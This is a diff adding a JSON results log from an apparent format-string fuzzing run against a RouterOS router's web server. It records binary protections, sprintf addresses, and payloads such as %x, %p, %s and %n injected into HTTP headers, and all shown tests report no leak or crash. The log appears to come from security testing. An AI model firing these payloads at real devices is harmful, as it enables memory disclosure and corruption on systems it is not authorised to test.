@@ -1,0 +1,2411 @@
+{
+  "metadata": {
+    "script": "attack_www_formatstring.py",
+    "target": "[REDACTED-INTERNAL-IP]",
+    "phase": 9,
+    "start_time": "2026-02-16T14:08:45.947033",
+    "end_time": "2026-02-16T14:10:55.515788",
+    "total_tests": 76,
+    "anomalies": 6,
+    "router_version": "7.20.8 (long-term)",
+    "initial_uptime": "2h9m23s",
+    "binary_info": {
+      "name": "www",
+      "sprintf_plt": "0x804e160",
+      "call_sites": [
+        "0x8052bcf",
+        "0x805ca6d"
+      ],
+      "protections": {
+        "NX": false,
+        "stack_canary": false,
+        "PIE": false
+      },
+      "arch": "x86 (32-bit)"
+    },
+    "crash_count": 0,
+    "crash_detected": false,
+    "router_log_count": 1000,
+    "router_interesting_events": 0,
+    "final_health": {
+      "alive": true,
+      "uptime": "2h11m43s",
+      "cpu_load": "0",
+      "free_memory": "837443584",
+      "version": "7.20.8 (long-term)"
+    }
+  },
+  "tests": [
+    {
+      "id": 1,
+      "category": "header_format_string",
+      "name": "header_Host_info_leak_hex",
+      "description": "Host: info_leak_hex",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:45.991055",
+      "details": {
+        "header": "Host",
+        "payload_name": "info_leak_hex",
+        "payload_value": "%x%x%x%x%x%x%x%x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:48:41 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 2,
+      "category": "header_format_string",
+      "name": "header_Host_info_leak_ptr",
+      "description": "Host: info_leak_ptr",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:46.307213",
+      "details": {
+        "header": "Host",
+        "payload_name": "info_leak_ptr",
+        "payload_value": "%p%p%p%p%p%p%p%p",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:48:41 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 3,
+      "category": "header_format_string",
+      "name": "header_Host_crash_deref",
+      "description": "Host: crash_deref",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:47.131625",
+      "details": {
+        "header": "Host",
+        "payload_name": "crash_deref",
+        "payload_value": "%s%s%s%s",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:48:42 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 4,
+      "category": "header_format_string",
+      "name": "header_Host_write_test",
+      "description": "Host: write_test",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:58.873493",
+      "details": {
+        "header": "Host",
+        "payload_name": "write_test",
+        "payload_value": "%n%n%n%n",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:48:53 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        },
+        "crash_check": {
+          "crash": false,
+          "pre_uptime": "2h9m25s",
+          "post_uptime": "2h9m36s"
+        }
+      }
+    },
+    {
+      "id": 5,
+      "category": "header_format_string",
+      "name": "header_Host_structured_leak",
+      "description": "Host: structured_leak",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:59.189651",
+      "details": {
+        "header": "Host",
+        "payload_name": "structured_leak",
+        "payload_value": "%08x.%08x.%08x.%08x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:48:54 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 6,
+      "category": "header_format_string",
+      "name": "header_Host_direct_param_access",
+      "description": "Host: direct_param_access",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:59.509811",
+      "details": {
+        "header": "Host",
+        "payload_name": "direct_param_access",
+        "payload_value": "AAAA%1$x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:48:55 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 7,
+      "category": "header_format_string",
+      "name": "header_User-Agent_info_leak_hex",
+      "description": "User-Agent: info_leak_hex",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:59.833973",
+      "details": {
+        "header": "User-Agent",
+        "payload_name": "info_leak_hex",
+        "payload_value": "%x%x%x%x%x%x%x%x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:48:55 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 8,
+      "category": "header_format_string",
+      "name": "header_User-Agent_info_leak_ptr",
+      "description": "User-Agent: info_leak_ptr",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:00.154133",
+      "details": {
+        "header": "User-Agent",
+        "payload_name": "info_leak_ptr",
+        "payload_value": "%p%p%p%p%p%p%p%p",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:48:55 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 9,
+      "category": "header_format_string",
+      "name": "header_User-Agent_crash_deref",
+      "description": "User-Agent: crash_deref",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:00.990551",
+      "details": {
+        "header": "User-Agent",
+        "payload_name": "crash_deref",
+        "payload_value": "%s%s%s%s",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:48:56 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 10,
+      "category": "header_format_string",
+      "name": "header_User-Agent_write_test",
+      "description": "User-Agent: write_test",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:12.568337",
+      "details": {
+        "header": "User-Agent",
+        "payload_name": "write_test",
+        "payload_value": "%n%n%n%n",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:06 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        },
+        "crash_check": {
+          "crash": false,
+          "pre_uptime": "2h9m39s",
+          "post_uptime": "2h9m50s"
+        }
+      }
+    },
+    {
+      "id": 11,
+      "category": "header_format_string",
+      "name": "header_User-Agent_structured_leak",
+      "description": "User-Agent: structured_leak",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:12.888497",
+      "details": {
+        "header": "User-Agent",
+        "payload_name": "structured_leak",
+        "payload_value": "%08x.%08x.%08x.%08x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:08 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 12,
+      "category": "header_format_string",
+      "name": "header_User-Agent_direct_param_access",
+      "description": "User-Agent: direct_param_access",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:13.204655",
+      "details": {
+        "header": "User-Agent",
+        "payload_name": "direct_param_access",
+        "payload_value": "AAAA%1$x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:08 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "No format string processing indicators detected.",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 13,
+      "category": "header_format_string",
+      "name": "header_Content-Type_info_leak_hex",
+      "description": "Content-Type: info_leak_hex",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:13.520813",
+      "details": {
+        "header": "Content-Type",
+        "payload_name": "info_leak_hex",
+        "payload_value": "%x%x%x%x%x%x%x%x",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:09 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 14,
+      "category": "header_format_string",
+      "name": "header_Content-Type_info_leak_ptr",
+      "description": "Content-Type: info_leak_ptr",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:13.844975",
+      "details": {
+        "header": "Content-Type",
+        "payload_name": "info_leak_ptr",
+        "payload_value": "%p%p%p%p%p%p%p%p",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nConnection: close\r\nContent-Length: 22450\r\nContent-Type: text/html\r\nDate: Mon, 16 Feb 2026 21:49:09 GMT\r\nExpires: 0\r\nLast-Modified: Fri, 30 Jan 2026 09:21:23 GMT\r\nPragma: no-cache\r\nX-Frame-Options: sameorigin\r\n\r\n<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"... [truncated, total 22703 chars]"
+        },
+        "requests_lib": {
+          "status_code": 200,
+          "response_length": 22450,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
+          "response_snippet": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p... [truncated, total 22450 chars]"
+        }
+      }
+    },
+    {
+      "id": 15,
+      "category": "header_format_string",
+      "name": "header_Content-Type_crash_deref",
+      "description": "Content-Type: crash_deref",
+      "result": "NO_LEAK",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:09:14.673389",
+      "details": {
+        "header": "Content-Type",
+        "payload_name": "crash_deref",
+        "payload_value": "%s%s%s%s",
+        "raw_socket": {
+          "status_code": 200,
+          "response_length": 22703,
+          "leaked_data": [],
+          "anomaly": false,
+          "details": "Format specifiers not reflected literally. ",
